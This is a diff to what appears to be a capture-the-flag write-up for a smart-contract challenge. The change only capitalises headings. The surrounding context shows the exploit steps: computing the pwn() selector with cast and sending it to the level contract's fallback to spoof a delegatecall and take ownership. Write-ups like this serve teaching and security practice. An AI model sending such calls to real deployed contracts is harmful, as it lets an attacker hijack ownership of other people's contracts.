@@ -48,7 +48,7 @@ We can **spoof** the delegate call by sending a transation that contains the fun
 
 ### Walkthrough
 
-##### 1. getting the methodId for the pwn() function
+##### 1. Getting the methodId for the pwn() function
 ```console
 cast calldata "pwn()"
 ```
@@ -56,7 +56,7 @@ output
 ```console
 0xdd365b8b
 ```
-##### 2. making a call to the fallback function where `msg.data` equals the calcualted methodId
+##### 2. Making a call to the fallback function where `msg.data` equals the calcualted methodId
 ```console
 cast send $LEVEL_ADDRESS 0xdd365b8b --gas 50000 --private-key $PRIVATE_KEY 
 ```
